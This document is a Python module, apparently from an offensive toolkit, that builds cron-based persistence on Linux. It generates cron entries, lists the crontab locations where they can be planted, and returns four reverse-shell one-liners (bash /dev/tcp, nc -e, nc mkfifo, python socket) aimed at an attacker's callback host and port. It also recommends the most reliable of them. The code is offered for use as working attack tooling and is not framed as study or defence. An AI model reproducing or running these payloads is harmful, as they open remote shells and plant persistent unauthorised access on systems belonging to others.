#!/usr/bin/env python3
"""
Cron Persistence - Linux persistence via cron jobs
"""
import logging
from typing import Dict, List

logger = logging.getLogger(__name__)

class CronPersistence:
    """
    Cron-based persistence techniques for Linux systems.
    """
    def __init__(self, config: Dict):
        """
        Initializes CronPersistence module.

        Args:
            config (Dict): Configuration dictionary
        """
        self.config = config
        logger.info("CronPersistence module initialized")

    def generate_cron_entry(self, command: str, interval: str = "daily") -> str:
        """
        Generate a cron entry for persistence.

        Args:
            command (str): Command to execute
            interval (str): Execution interval (hourly, daily, weekly, reboot)

        Returns:
            str: Cron entry string
        """
        logger.info(f"Generating cron entry for: {command}")

        intervals = {
            "hourly": "0 * * * *",
            "daily": "0 0 * * *",
            "weekly": "0 0 * * 0",
            "reboot": "@reboot",
            "every_5min": "*/5 * * * *"
        }

        cron_time = intervals.get(interval, "0 0 * * *")
        cron_entry = f"{cron_time} {command}"

        logger.info(f"Generated cron entry: {cron_entry}")
        return cron_entry

    def suggest_cron_locations(self, username: str = None) -> Dict:
        """
        Suggest locations for cron-based persistence.

        Args:
            username (str): Target username

        Returns:
            Dict: Cron file locations and methods
        """
        locations = {
            "user_crontab": f"crontab -e (for user {username or 'current'})",
            "system_cron_dirs": [
                "/etc/cron.d/",
                "/etc/cron.daily/",
                "/etc/cron.hourly/",
                "/etc/cron.weekly/",
                "/var/spool/cron/crontabs/"
            ],
            "cron_files": [
                "/etc/crontab",
                f"/var/spool/cron/crontabs/{username}" if username else None
            ]
        }

        return {k: v for k, v in locations.items() if v is not None}

    def generate_persistence_payload(self, callback_host: str, callback_port: int) -> Dict:
        """
        Generate reverse shell cron payload.

        Args:
            callback_host (str): Attacker's IP/hostname
            callback_port (int): Attacker's listening port

        Returns:
            Dict: Payload information
        """
        payloads = {
            "bash_tcp": f"bash -i >& /dev/tcp/{callback_host}/{callback_port} 0>&1",
            "nc_traditional": f"nc {callback_host} {callback_port} -e /bin/bash",
            "nc_mkfifo": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {callback_host} {callback_port} >/tmp/f",
            "python": f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{callback_host}\",{callback_port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
        }

        return {
            "callback_host": callback_host,
            "callback_port": callback_port,
            "payloads": payloads,
            "recommendation": "Use bash_tcp or nc_mkfifo for reliability"
        }
